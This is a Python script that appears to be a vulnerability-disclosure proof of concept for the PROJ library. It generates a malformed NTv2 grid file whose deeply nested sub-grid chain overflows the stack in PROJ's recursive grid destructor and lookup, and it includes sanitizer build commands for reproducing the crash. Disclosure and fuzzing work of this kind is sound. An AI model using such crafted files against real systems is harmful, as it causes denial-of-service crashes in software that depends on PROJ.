#!/usr/bin/env python3
"""
PoC generator for SF10: Stack overflow in NTv2Grid::~NTv2Grid() via deeply
nested grid hierarchy (no recursion depth limit).

This script creates a malformed NTv2 grid file with a deeply nested
parent-child chain of sub-grids. When PROJ loads this file, it builds
a chain of NTv2Grid objects where each grid is a child of the previous.
When the NTv2GridSet is destroyed, ~NTv2Grid() recursively calls the
destructor of each child's m_children vector, causing a stack overflow
at ~N call frames deep.

The same recursive structure also affects HorizontalShiftGrid::gridAt()
which traverses m_children recursively.

Usage:
    python3 grids_SF10_poc_gen.py [output.gsb] [depth]
    Default: sf10_deep.gsb with 50000 levels

Run PoC:
    clang++ -std=c++17 -fsanitize=address -g -O1 \
      -I/src/PROJ/include -I/src/PROJ/src \
      grids_SF10_poc.cpp \
      /proj4-build/lib/libproj.a \
      -lpthread /host-lib/libsqlite3.so.0 -ldl -lm \
      -o poc_sf10
    ASAN_OPTIONS=detect_leaks=0 PROJ_DATA=/out/asan ./poc_sf10 sf10_deep.gsb
"""
import struct
import sys
import os


def pack_str(key, value):
    """Pack a string NTv2 record: 8-byte key + 8-byte value."""
    return key.encode('latin-1').ljust(8)[:8] + value.encode('latin-1').ljust(8)[:8]


def pack_int(key, value):
    """Pack an integer NTv2 record: 8-byte key + 4-byte LE int + 4 padding."""
    return key.encode('latin-1').ljust(8)[:8] + struct.pack('<i', value) + b'\x00' * 4


def pack_double(key, value):
    """Pack a double NTv2 record: 8-byte key + 8-byte LE double."""
    return key.encode('latin-1').ljust(8)[:8] + struct.pack('<d', value)


def make_deep_ntv2(filename, depth=50000):
    """
    Create an NTv2 .gsb file with `depth` sub-grids forming a linear chain.

    NTv2 longitude convention:
    - Stored as positive arc-seconds WEST (western hemisphere positive)
    - E_LONG = eastern boundary (smaller west value)
    - W_LONG = western boundary (larger west value)
    - Parser: east = -E_LONG * DEG_TO_RAD/3600, west = -W_LONG * DEG_TO_RAD/3600
    - Valid condition: west < east

    Each sub-grid is a 2x2 cell grid (minimum size) with:
    - resolution = range (so columns = range/res + 1 = 2)
    - Parent at level i-1 contains child at level i (extents shrink by 4 arcsec/side)

    The chain triggers:
    1. Stack overflow in ~NTv2Grid() recursive destructor at cleanup
    2. Stack overflow in HorizontalShiftGrid::gridAt() during coordinate lookup
    """
    # Base extents: large enough for ~50000 levels (step = 2 arcsec/side/level)
    base_s = 0.0          # south latitude in arcsec
    base_n = 200000.0     # north latitude in arcsec (~55.6 degrees)
    base_e = 100000.0     # E_LONG in arcsec west (~27.8 degrees west)
    base_w = 300000.0     # W_LONG in arcsec west (~83.3 degrees west)
    step = 2.0            # arcsec per side per level

    actual_depth = 0
    buf = bytearray()

    # Overview header (11 records x 16 bytes = 176 bytes)
    buf += pack_int('NUM_OREC', 11)
    buf += pack_int('NUM_SREC', 11)
    buf += pack_int('NUM_FILE', depth)
    buf += pack_str('GS_TYPE ', 'SECONDS ')
    buf += pack_str('VERSION ', 'NTv2.0  ')
    buf += pack_str('SYSTEM_F', 'NAD27   ')
    buf += pack_str('SYSTEM_T', 'NAD83   ')
    buf += pack_double('MAJOR_F ', 6378206.4)
    buf += pack_double('MINOR_F ', 6356583.8)
    buf += pack_double('MAJOR_T ', 6378137.0)
    buf += pack_double('MINOR_T ', 6356752.3)

    # Sub-grid records: each 11 records x 16 bytes = 176 bytes + 4*4*4=64 bytes data
    for i in range(depth):
        margin = i * step
        south = base_s + margin
        north = base_n - margin
        e_long = base_e + margin   # eastern boundary moves westward
        w_long = base_w - margin   # western boundary moves eastward

        if north <= south + 1.0 or w_long <= e_long + 1.0:
            print(f"Extent exhausted at depth {i}", file=sys.stderr)
            break

        # 2x2 grid: resolution = range
        lat_range = north - south
        lon_range = w_long - e_long
        res_lat = lat_range   # rows = lat_range/res + 1 = 2
        res_lon = lon_range   # cols = lon_range/res + 1 = 2
        gs_count = 4          # 2 * 2

        name = ('G%07d' % i)[:8]
        parent = 'NONE    ' if i == 0 else ('G%07d' % (i - 1))[:8]

        buf += pack_str('SUB_NAME', name)
        buf += pack_str('PARENT  ', parent)
        buf += pack_str('CREATED ', '20010101')
        buf += pack_str('UPDATED ', '20010101')
        buf += pack_double('S_LAT   ', south)
        buf += pack_double('N_LAT   ', north)
        buf += pack_double('E_LONG  ', e_long)   # positive arcsec west
        buf += pack_double('W_LONG  ', w_long)   # positive arcsec west
        buf += pack_double('LAT_INC ', res_lat)
        buf += pack_double('LONG_INC', res_lon)
        buf += pack_int('GS_COUNT', gs_count)
        # Grid data: gs_count cells * 4 floats (lat_shift, lon_shift, lat_acc, lon_acc)
        buf += struct.pack('<ffff', 0.0, 0.0, 0.0, 0.0) * gs_count
        actual_depth += 1

    # End record
    buf += b'END     ' + b'\x00' * 8

    with open(filename, 'wb') as f:
        f.write(buf)

    size = os.path.getsize(filename)
    print(f"Created {filename}: {actual_depth} levels, {size} bytes")
    return actual_depth


def make_deep_ntv2_large(filename, depth=500000, step=0.2):
    """
    Same as make_deep_ntv2() but with a smaller step to allow more levels.
    ~500000 levels needed to trigger stack overflow with default 8MB Linux stack.
    File size: ~120MB.
    """
    # Use same extents but smaller step
    base_s = 0.0
    base_n = 200000.0
    base_e = 100000.0
    base_w = 300000.0

    actual_depth = 0
    buf = bytearray()

    buf += pack_int('NUM_OREC', 11)
    buf += pack_int('NUM_SREC', 11)
    buf += pack_int('NUM_FILE', depth)
    buf += pack_str('GS_TYPE ', 'SECONDS ')
    buf += pack_str('VERSION ', 'NTv2.0  ')
    buf += pack_str('SYSTEM_F', 'NAD27   ')
    buf += pack_str('SYSTEM_T', 'NAD83   ')
    buf += pack_double('MAJOR_F ', 6378206.4)
    buf += pack_double('MINOR_F ', 6356583.8)
    buf += pack_double('MAJOR_T ', 6378137.0)
    buf += pack_double('MINOR_T ', 6356752.3)

    for i in range(depth):
        margin = i * step
        south = base_s + margin
        north = base_n - margin
        e_long = base_e + margin
        w_long = base_w - margin

        if north <= south + 1.0 or w_long <= e_long + 1.0:
            print(f"Extent exhausted at depth {i}", file=sys.stderr)
            break

        lat_range = north - south
        lon_range = w_long - e_long
        res_lat = lat_range
        res_lon = lon_range

        name = ('G%07d' % i)[:8]
        parent = 'NONE    ' if i == 0 else ('G%07d' % (i - 1))[:8]

        buf += pack_str('SUB_NAME', name)
        buf += pack_str('PARENT  ', parent)
        buf += pack_str('CREATED ', '20010101')
        buf += pack_str('UPDATED ', '20010101')
        buf += pack_double('S_LAT   ', south)
        buf += pack_double('N_LAT   ', north)
        buf += pack_double('E_LONG  ', e_long)
        buf += pack_double('W_LONG  ', w_long)
        buf += pack_double('LAT_INC ', res_lat)
        buf += pack_double('LONG_INC', res_lon)
        buf += pack_int('GS_COUNT', 4)
        buf += struct.pack('<ffff', 0.0, 0.0, 0.0, 0.0) * 4
        actual_depth += 1

    buf += b'END     ' + b'\x00' * 8

    with open(filename, 'wb') as f:
        f.write(buf)

    size = os.path.getsize(filename)
    print(f"Created {filename}: {actual_depth} levels, {size} bytes")
    return actual_depth


if __name__ == '__main__':
    output = sys.argv[1] if len(sys.argv) > 1 else 'sf10_deep.gsb'
    depth = int(sys.argv[2]) if len(sys.argv) > 2 else 50000
    # Use small step for 500000-level version (needed for 8MB stack crash)
    if depth > 100000:
        make_deep_ntv2_large(output, depth, step=0.2)
    else:
        make_deep_ntv2(output, depth)
